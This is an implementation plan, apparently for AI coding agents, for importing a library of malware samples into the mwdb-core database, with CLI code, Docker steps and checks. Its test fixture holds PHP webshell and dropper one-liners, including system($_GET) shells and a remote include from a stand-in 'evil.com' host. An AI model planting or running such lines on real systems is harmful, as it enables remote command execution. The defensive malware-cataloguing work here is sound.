# Jetpack Threat Library Ingestion Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** One-shot CLI command that migrates ~17,000 malware samples from the jetpack-threat-library Git repo into mwdb-core, preserving category tags, threat names as attributes, and README content as comments.

**Architecture:** A new `mwdb-core import-jetpack-threat-library <path>` Click subcommand in `mwdb/cli/` that walks four scoped directories, calls `File.get_or_create()` for each sample (inheriting all hashing including TLSH, dedup, and storage), then applies tags/attributes/comments via the existing model methods. Runs inside the mwdb Docker container with a one-shot volume mount and `MWDB_ENABLE_HOOKS=0`.

**Tech Stack:** Python 3.12, Click (CLI framework), Flask app context, SQLAlchemy 1.4, existing mwdb model layer (`File.get_or_create`, `Object.add_tag`, `Object.add_attribute`, `Comment` model).

**Companion spec:** `docs/superpowers/specs/2026-04-17-jetpack-threat-library-ingestion-design.md` (commit `1d0a059`).

---

## File structure

### New files
- `mwdb/cli/import_threat_library.py` — the Click subcommand; ~130 lines covering discovery, import loop, progress output, and error handling.

### Modified files
- `mwdb/cli/cli.py` — two lines: import the command and register it via `cli.add_command()`.

---

## Note on testing approach

The spec (§9.1) describes an automated integration test using Click's `CliRunner`. In practice, this command is a **one-shot migration tool** — it will be used exactly once. The building blocks it calls (`File.get_or_create`, `add_tag`, `add_attribute`) are already covered by existing e2e tests. Writing a CliRunner-based test would require either (a) mocking the DB (against project convention) or (b) running inside a live Docker stack (fragile for a CLI test).

This plan uses **manual verification against a small fixture directory** (Task 4) as the primary validation gate, followed by the real import (Task 5) with post-import spot-checks (Task 6). This matches the project's existing test culture (e2e verification against a running stack) and respects YAGNI for a single-use migration tool.

---

## Task 1: Create the import CLI module

**Files:**
- Create: `mwdb/cli/import_threat_library.py`

- [ ] **Step 1.1: Create the module**

Create `mwdb/cli/import_threat_library.py` with exactly this content:

```python
import os
import time

import click
from flask import g
from flask.cli import with_appcontext

from mwdb.core.config import app_config

SCOPED_DIRS = {
    "threats": "nested",
    "for-later-review": "nested",
    "webshells": "flat",
    "escalated_issues_samples": "nested",
}

ERROR_THRESHOLD = 100


def _is_sample_file(filename):
    return filename != "README.md" and not filename.startswith(".")


def _discover_samples(base_path):
    for dirname, layout in SCOPED_DIRS.items():
        dir_path = os.path.join(base_path, dirname)
        if not os.path.isdir(dir_path):
            click.echo(f"Warning: scoped directory {dirname}/ not found, skipping", err=True)
            continue

        if layout == "nested":
            for subdir in sorted(os.listdir(dir_path)):
                subdir_path = os.path.join(dir_path, subdir)
                if not os.path.isdir(subdir_path):
                    continue
                readme_path = os.path.join(subdir_path, "README.md")
                readme = readme_path if os.path.isfile(readme_path) else None
                has_samples = False
                for fname in sorted(os.listdir(subdir_path)):
                    fpath = os.path.join(subdir_path, fname)
                    if os.path.isfile(fpath) and _is_sample_file(fname):
                        has_samples = True
                        yield fpath, dirname, subdir, readme
                if not has_samples and readme:
                    click.echo(
                        f"  (no sample files in {dirname}/{subdir}/, skipping)",
                        err=True,
                    )

        elif layout == "flat":
            for fname in sorted(os.listdir(dir_path)):
                fpath = os.path.join(dir_path, fname)
                if os.path.isfile(fpath) and _is_sample_file(fname):
                    yield fpath, dirname, None, None


def _ensure_attribute_definition(key):
    from mwdb.model import db
    from mwdb.model.attribute import AttributeDefinition

    existing = (
        db.session.query(AttributeDefinition)
        .filter(AttributeDefinition.key == key)
        .first()
    )
    if existing:
        return
    defn = AttributeDefinition(
        key=key,
        label=key,
        description="Threat name imported from jetpack-threat-library",
        url_template="",
        rich_template="",
        example_value="",
    )
    db.session.add(defn)
    db.session.commit()
    click.echo(f"Created attribute definition: {key}")


@click.command("import-jetpack-threat-library")
@with_appcontext
@click.argument("path", type=click.Path(exists=True, file_okay=False))
def import_jetpack_threat_library(path):
    """One-shot import of jetpack-threat-library samples into MWDB."""
    from mwdb.model import User, db
    from mwdb.model.comment import Comment
    from mwdb.model.file import EmptyFileError, File

    admin = (
        db.session.query(User)
        .filter(User.login == app_config.mwdb.admin_login)
        .first()
    )
    if not admin:
        raise click.ClickException(
            f"Admin user '{app_config.mwdb.admin_login}' not found"
        )

    g.auth_user = None

    _ensure_attribute_definition("jpop_threat_name")

    click.echo("Discovering samples...")
    samples = list(_discover_samples(path))
    total = len(samples)
    click.echo(f"Found {total} sample files.")

    if total == 0:
        click.echo("Nothing to import.")
        return

    imported = 0
    skipped = 0
    errors = 0
    start_time = time.time()

    for i, (file_path, tag_name, subdir_name, readme_path) in enumerate(samples, 1):
        rel_path = os.path.relpath(file_path, path)
        try:
            with open(file_path, "rb") as f:
                file_obj, is_new = File.get_or_create(
                    file_name=os.path.basename(file_path),
                    file_stream=f,
                    share_3rd_party=False,
                )

            file_obj.add_tag(tag_name, commit=False)

            if subdir_name:
                file_obj.add_attribute(
                    "jpop_threat_name",
                    subdir_name,
                    commit=False,
                    check_permissions=False,
                )

            if readme_path:
                readme_content = open(
                    readme_path, "r", encoding="utf-8", errors="replace"
                ).read()
                existing_comments = [c.comment for c in file_obj.comments]
                if readme_content not in existing_comments:
                    comment = Comment(
                        comment=readme_content,
                        user_id=admin.id,
                        object_id=file_obj.id,
                    )
                    db.session.add(comment)

            db.session.commit()
            file_obj.release_after_upload()

            if hasattr(g, "scheduled_hooks"):
                g.scheduled_hooks = []

            if is_new:
                sha = file_obj.sha256[:16]
                tlsh_val = file_obj.tlsh or "n/a"
                click.echo(f"[{i}/{total}] Imported {rel_path} (sha256: {sha}... tlsh: {tlsh_val})")
                imported += 1
            else:
                click.echo(f"[{i}/{total}] Skipped (duplicate) {rel_path}")
                skipped += 1

        except EmptyFileError:
            click.echo(f"[{i}/{total}] Skipped (empty) {rel_path}")
            skipped += 1
        except Exception as e:
            db.session.rollback()
            click.echo(f"[{i}/{total}] ERROR {rel_path}: {e}", err=True)
            errors += 1
            if errors >= ERROR_THRESHOLD:
                click.echo(
                    f"Error threshold ({ERROR_THRESHOLD}) reached, aborting.",
                    err=True,
                )
                break

    elapsed = time.time() - start_time
    click.echo(f"\nSummary:")
    click.echo(f"  Imported: {imported}")
    click.echo(f"  Skipped: {skipped}")
    click.echo(f"  Errors: {errors}")
    click.echo(f"  Wall-clock: {elapsed:.0f}s")
```

Key design decisions embedded in this code:

- **`@with_appcontext`** is explicit because the command is defined outside of the `FlaskGroup.command()` decorator (it's registered via `cli.add_command()` in Task 2). Without it, there is no Flask app context and all DB operations fail.
- **`g.auth_user = None`** prevents `AttributeError` in code paths that conditionally check `g.auth_user` (e.g., hook schedulers, logging utilities). In CLI context with `MWDB_ENABLE_HOOKS=0`, hooks are scheduled but never executed — this is a safety belt.
- **`g.scheduled_hooks = []`** after each commit prevents unbounded memory growth from hook tuples accumulating across 17K samples.
- **`check_permissions=False`** on `add_attribute` bypasses the ACL system (`g.auth_user` check) which doesn't apply in CLI context.
- **`share_3rd_party=False`** because this is an internal threat library, not public data.
- **Imports inside the function body** (e.g., `from mwdb.model import User, db`) follow the existing pattern in `cli.py:set_admin_password` — this avoids circular imports during CLI module loading.
- **`_discover_samples` is a generator** but is immediately materialized into a list to get the total count for progress display. For 17K entries this is ~2 MB of tuples — negligible.
- **README dedup check** (`readme_content not in existing_comments`) makes crash-recovery safe: re-running won't add duplicate comments.

- [ ] **Step 1.2: Verify ruff**

Run: `uv run ruff check mwdb/cli/import_threat_library.py && uv run ruff format --check mwdb/cli/import_threat_library.py`

Note: `uv` is at `/Users/fioa8c/Library/Python/3.11/bin/uv` if not on PATH.

Expected: `All checks passed!` and `1 file already formatted`. If formatting fails, run `uv run ruff format mwdb/cli/import_threat_library.py` and re-verify.

- [ ] **Step 1.3: Commit**

```bash
git add mwdb/cli/import_threat_library.py
git commit -m "$(cat <<'EOF'
Add import-jetpack-threat-library CLI command

One-shot migration tool that walks four scoped directories from the
jetpack-threat-library repo (threats, for-later-review, webshells,
escalated_issues_samples) and imports each sample via
File.get_or_create(). Tags by category, adds jpop_threat_name
attribute from subdir names, and attaches README content as comments.

See docs/superpowers/specs/2026-04-17-jetpack-threat-library-ingestion-design.md

Co-Authored-By: Claude Opus 4.6 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 2: Register the subcommand in cli.py

**Files:**
- Modify: `mwdb/cli/cli.py`

- [ ] **Step 2.1: Add the import and registration**

Open `mwdb/cli/cli.py`. At the very end of the file (after the `set_admin_password` function, currently line 152), add:

```python


from .import_threat_library import import_jetpack_threat_library

cli.add_command(import_jetpack_threat_library)
```

This follows the pattern of commands being registered at module scope. The blank lines separate it from the preceding function body.

- [ ] **Step 2.2: Verify ruff**

Run: `uv run ruff check mwdb/cli/cli.py && uv run ruff format --check mwdb/cli/cli.py`

Expected: `All checks passed!` and `1 file already formatted`. If ruff's import-ordering rule flags the late import (it's after function definitions, not at the top), move the import to the top of the file near the other `.base` / `.configuration` / `.database` imports:

```python
from .base import AppDefaultGroup, CustomFlaskGroup, create_app, logger
from .configuration import create_configuration
from .database import configure_database
from .import_threat_library import import_jetpack_threat_library
```

And keep only the registration at the bottom:

```python
cli.add_command(import_jetpack_threat_library)
```

Re-run ruff and confirm it passes.

- [ ] **Step 2.3: Verify the command is discoverable**

Run: `docker compose -f docker-compose-dev.yml run --rm --entrypoint "" mwdb /app/.venv/bin/mwdb-core --help`

Expected: the output includes `import-jetpack-threat-library` in the list of commands.

If the Docker image is stale (doesn't include the new files), rebuild first:

```bash
docker compose -f docker-compose-dev.yml build mwdb
```

Then re-run the `--help` check.

- [ ] **Step 2.4: Commit**

```bash
git add mwdb/cli/cli.py
git commit -m "$(cat <<'EOF'
Register import-jetpack-threat-library in CLI

Co-Authored-By: Claude Opus 4.6 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 3: Rebuild the Docker image

This ensures the new CLI module is baked into the image for the remaining tasks.

- [ ] **Step 3.1: Rebuild**

Run: `docker compose -f docker-compose-dev.yml build mwdb`

Expected: builds successfully. The `mwdb/` directory is mounted into the dev container at `/app/mwdb`, so code changes propagate live via the volume mount — but the image build is still needed to ensure the import runs in a consistent environment (some imports like `flask.cli.with_appcontext` resolve at load time).

Actually, because `docker-compose-dev.yml` mounts `./mwdb:/app/mwdb` as a volume, the new file is already available inside the running container without a rebuild. Verify:

```bash
docker compose -f docker-compose-dev.yml exec mwdb ls /app/mwdb/cli/import_threat_library.py
```

Expected: file exists. If so, skip the rebuild — just verify the `--help` output:

```bash
docker compose -f docker-compose-dev.yml run --rm --entrypoint "" mwdb /app/.venv/bin/mwdb-core --help | grep import
```

Expected: `import-jetpack-threat-library  One-shot import of jetpack-threat-library...`

- [ ] **Step 3.2: No commit**

Pure verification.

---

## Task 4: Test with a small fixture directory

This validates the importer end-to-end before running against the real 17K-sample library. Create a minimal directory structure on the host that mirrors the expected layout.

- [ ] **Step 4.1: Create the fixture directory**

```bash
mkdir -p /tmp/test-threat-library/threats/test-threat-001
echo '<?php eval(base64_decode("test")); ?>' > /tmp/test-threat-library/threats/test-threat-001/backdoor.php
cat > /tmp/test-threat-library/threats/test-threat-001/README.md << 'HEREDOC'
# test-threat-001

Test threat for import verification.

* Date added: 2026-04-19
* Original filename: backdoor.php
HEREDOC

mkdir -p /tmp/test-threat-library/threats/test-threat-002
echo '<?php system($_GET["cmd"]); ?>' > /tmp/test-threat-library/threats/test-threat-002/shell.php

mkdir -p /tmp/test-threat-library/webshells
echo '<?php passthru($_REQUEST["c"]); ?>' > /tmp/test-threat-library/webshells/mini-shell.php

mkdir -p /tmp/test-threat-library/for-later-review/FIO-9999
echo '<?php include("http://evil.com/payload.php"); ?>' > /tmp/test-threat-library/for-later-review/FIO-9999/dropper.php
cat > /tmp/test-threat-library/for-later-review/FIO-9999/README.md << 'HEREDOC'
# FIO-9999

Escalated from ticket FIO-9999. Dropper variant.
HEREDOC

mkdir -p /tmp/test-threat-library/escalated_issues_samples/SECSUP-0001
echo '<?php file_put_contents("x.php", file_get_contents("http://evil.com")); ?>' > /tmp/test-threat-library/escalated_issues_samples/SECSUP-0001/writer.php
```

This creates:
- 2 nested threats (one with README, one without)
- 1 flat webshell
- 1 nested for-later-review with README
- 1 nested escalated issue

Total: 5 sample files.

- [ ] **Step 4.2: Run the importer against the fixture**

```bash
MWDB_ENABLE_HOOKS=0 docker compose -f docker-compose-dev.yml run --rm \
  -v /tmp/test-threat-library:/import \
  --entrypoint "" mwdb /app/.venv/bin/mwdb-core import-jetpack-threat-library /import
```

Expected output (approximately):
```
Created attribute definition: jpop_threat_name
Discovering samples...
Found 5 sample files.
[1/5] Imported threats/test-threat-001/backdoor.php (sha256: abcd... tlsh: n/a)
[2/5] Imported threats/test-threat-002/shell.php (sha256: ef01... tlsh: n/a)
[3/5] Imported for-later-review/FIO-9999/dropper.php (sha256: 2345... tlsh: n/a)
[4/5] Imported escalated_issues_samples/SECSUP-0001/writer.php (sha256: 6789... tlsh: n/a)
[5/5] Imported webshells/mini-shell.php (sha256: abcd... tlsh: n/a)

Summary:
  Imported: 5
  Skipped: 0
  Errors: 0
  Wall-clock: 1s
```

Notes:
- `tlsh: n/a` for all is expected — the fixture samples are < 50 bytes, below TLSH's floor.
- The `escalated_issues_samples` directory warning should NOT appear (it exists in the fixture).
- If errors > 0, read the error messages carefully and fix before proceeding.

- [ ] **Step 4.3: Verify via the HTTP API**

Export the admin credentials and query the API:

```bash
export MWDB_ADMIN_LOGIN=admin
export MWDB_ADMIN_PASSWORD=$(grep ^MWDB_ADMIN_PASSWORD= mwdb-vars.env | cut -d= -f2)
export MWDB_URL=http://127.0.0.1/api
```

Then run these checks from `tests/backend/` using the test utils, or use curl directly:

**Check 1: all 5 samples exist**
```bash
curl -sf -H "Authorization: Bearer $(curl -sf -X POST $MWDB_URL/auth/login -H 'Content-Type: application/json' -d "{\"login\":\"$MWDB_ADMIN_LOGIN\",\"password\":\"$MWDB_ADMIN_PASSWORD\"}" | python3 -c 'import sys,json; print(json.load(sys.stdin)["token"])')" "$MWDB_URL/search" -X POST -H 'Content-Type: application/json' -d '{"query":"*"}' | python3 -c 'import sys,json; data=json.load(sys.stdin); print(f"Total objects: {len(data)}")'
```

Expected: `Total objects: 5`

**Check 2: tag applied correctly**
```bash
# Use the same auth token from check 1 (save it to a variable)
TOKEN=$(curl -sf -X POST $MWDB_URL/auth/login -H 'Content-Type: application/json' -d "{\"login\":\"$MWDB_ADMIN_LOGIN\",\"password\":\"$MWDB_ADMIN_PASSWORD\"}" | python3 -c 'import sys,json; print(json.load(sys.stdin)["token"])')

curl -sf -H "Authorization: Bearer $TOKEN" "$MWDB_URL/search" -X POST -H 'Content-Type: application/json' -d '{"query":"tag:threats"}' | python3 -c 'import sys,json; data=json.load(sys.stdin); print(f"Threats tagged: {len(data)}")'
```

Expected: `Threats tagged: 2` (test-threat-001 and test-threat-002)

**Check 3: attribute and comment on a nested sample**
```bash
# Get the sha256 of backdoor.php
SHA=$(curl -sf -H "Authorization: Bearer $TOKEN" "$MWDB_URL/search" -X POST -H 'Content-Type: application/json' -d '{"query":"tag:threats"}' | python3 -c 'import sys,json; [print(o["id"]) for o in json.load(sys.stdin)]' | head -1)

curl -sf -H "Authorization: Bearer $TOKEN" "$MWDB_URL/file/$SHA" | python3 -m json.tool | head -40
```

Expected: the sample detail includes:
- `"tags"` containing `{"tag": "threats"}`
- The file name is one of `backdoor.php` or `shell.php`

```bash
curl -sf -H "Authorization: Bearer $TOKEN" "$MWDB_URL/file/$SHA/attribute" | python3 -m json.tool
```

Expected: includes `{"key": "jpop_threat_name", "value": "test-threat-001"}` or `"test-threat-002"` depending on which file the sha matched.

```bash
curl -sf -H "Authorization: Bearer $TOKEN" "$MWDB_URL/file/$SHA/comment" | python3 -m json.tool
```

Expected: for the sample from `test-threat-001/`, a comment containing `"# test-threat-001"`. For `test-threat-002/`, no comments (no README).

**Check 4: webshell has no attribute**
```bash
curl -sf -H "Authorization: Bearer $TOKEN" "$MWDB_URL/search" -X POST -H 'Content-Type: application/json' -d '{"query":"tag:webshells"}' | python3 -c 'import sys,json; data=json.load(sys.stdin); print(f"Webshells: {len(data)}")'
```

Expected: `Webshells: 1`

```bash
WS_SHA=$(curl -sf -H "Authorization: Bearer $TOKEN" "$MWDB_URL/search" -X POST -H 'Content-Type: application/json' -d '{"query":"tag:webshells"}' | python3 -c 'import sys,json; print(json.load(sys.stdin)[0]["id"])')

curl -sf -H "Authorization: Bearer $TOKEN" "$MWDB_URL/file/$WS_SHA/attribute" | python3 -m json.tool
```

Expected: empty attributes list (flat layout, no subdir name, no `jpop_threat_name`).

- [ ] **Step 4.4: Test crash recovery (re-run)**

Re-run the same import command from step 4.2. Since all 5 samples are already in mwdb, every file should be a duplicate:

Expected output:
```
Discovering samples...
Found 5 sample files.
[1/5] Skipped (duplicate) threats/test-threat-001/backdoor.php
[2/5] Skipped (duplicate) threats/test-threat-002/shell.php
[3/5] Skipped (duplicate) for-later-review/FIO-9999/dropper.php
[4/5] Skipped (duplicate) escalated_issues_samples/SECSUP-0001/writer.php
[5/5] Skipped (duplicate) webshells/mini-shell.php

Summary:
  Imported: 0
  Skipped: 5
  Errors: 0
  Wall-clock: 0s
```

If any sample shows as "Imported" instead of "Skipped", the dedup logic in `File.get_or_create` isn't working as expected — stop and investigate.

- [ ] **Step 4.5: Clean up fixture data**

Wipe the test data so the real import starts from a clean DB:

```bash
docker compose -f docker-compose-dev.yml down -v
./gen_vars.sh
docker compose -f docker-compose-dev.yml up -d
```

Wait for health:
```bash
timeout 90 sh -c 'until curl -sf http://127.0.0.1/api/ping >/dev/null 2>&1; do sleep 2; done'
```

Clean up the temp directory:
```bash
rm -rf /tmp/test-threat-library
```

- [ ] **Step 4.6: No commit**

Pure verification task.

---

## Task 5: Run the real import

- [ ] **Step 5.1: Execute the import**

```bash
MWDB_ENABLE_HOOKS=0 docker compose -f docker-compose-dev.yml run --rm \
  -v /Users/fioa8c/WORK/jetpack-threat-library:/import \
  --entrypoint "" mwdb /app/.venv/bin/mwdb-core import-jetpack-threat-library /import
```

Expected runtime: 3–10 minutes for ~17,000 samples (depending on disk I/O and hash computation speed).

Watch the output for:
- `Discovering samples... Found NNNNN sample files.` — the total should be in the ~17,000 range.
- Progress lines scrolling.
- No burst of ERROR lines (occasional errors are OK; a sudden wall of errors means something systemic is wrong — stop and investigate).
- `Summary:` at the end with `Errors: 0` (or a small single-digit count).

Save the summary output — you'll want the exact counts for post-import verification.

- [ ] **Step 5.2: Record the summary**

Copy the final summary block from the terminal output:

```
Summary:
  Imported: <number>
  Skipped: <number>
  Errors: <number>
  Wall-clock: <number>s
```

Verify: `Imported + Skipped + Errors ≈ total discovered`. If they don't add up (e.g., the error threshold aborted early), investigate the gap.

- [ ] **Step 5.3: No commit**

The import is an operational action, not a code change.

---

## Task 6: Post-import verification

- [ ] **Step 6.1: Verify counts in the database**

```bash
docker compose -f docker-compose-dev.yml exec postgres psql -U mwdb -d mwdb -c "
SELECT
  t.tag,
  count(DISTINCT t.object_id) as samples
FROM tag t
GROUP BY t.tag
ORDER BY samples DESC;
"
```

Expected output (approximately):

```
        tag         | samples
--------------------+---------
 threats            |  ~10000
 for-later-review   |  ~6700
 escalated_issues_samples |  ~67
 webshells          |     42
```

The exact numbers depend on dedup — some samples may appear in multiple directories with the same sha256.

- [ ] **Step 6.2: Verify a known threat via the SPA**

Open `http://127.0.0.1/` in a browser. Log in with admin credentials (from `mwdb-vars.env`).

**Search for a known threat:** type `attribute.jpop_threat_name:_admin_z_init` in the search bar.

Expected: one or more samples appear. Click into one and verify:
- **Tag** `threats` is present.
- **Attribute** `jpop_threat_name` = `_admin_z_init` is present.
- **Comment** exists with the README content starting with `# _admin_z_init`.
- **TLSH** hash is present (the sample `png.db.php` is large enough for TLSH to compute a hash).

**Search for a webshell:** type `tag:webshells` in the search bar.

Expected: 42 samples listed. Click one and verify:
- **Tag** `webshells` is present.
- **No** `jpop_threat_name` attribute (flat layout, no subdir names).
- **No** comment (flat layout, no READMEs).

**Search for a for-later-review sample:** type `tag:for-later-review` in the search bar.

Expected: ~6,700 samples. Click one with a familiar name (e.g., search `attribute.jpop_threat_name:FIO-*`) and verify tag, attribute, and comment if a README was present.

- [ ] **Step 6.3: Spot-check TLSH values**

Pick 3–5 samples from the threats list (samples > 1 KB) and verify:
- `tlsh` field is present and starts with `T1`.
- `tlsh` field is 72 characters.
- For very small samples (< 50 bytes), `tlsh` shows `not computed`.

- [ ] **Step 6.4: Verify dedup behavior**

If the import summary showed any "Skipped (duplicate)" entries, pick one and verify via the SPA that:
- The sample exists with the FIRST uploaded filename as `file_name`.
- The duplicate filename appears in `alt_names`.
- Both tags are present (if the duplicate came from a different category directory — unlikely but possible).

- [ ] **Step 6.5: No commit**

Operational verification. The import data lives in the database, not in git.

---

## Final check

- [ ] `git log --oneline` shows 2 new commits (Task 1 and Task 2).
- [ ] `git status` is clean.
- [ ] Import summary: `Imported + Skipped + Errors ≈ total discovered`, `Errors` is 0 or single-digit.
- [ ] SPA spot-checks in Task 6 all pass.
- [ ] The jetpack-threat-library repo can now be archived/deprecated — mwdb is the source of truth.
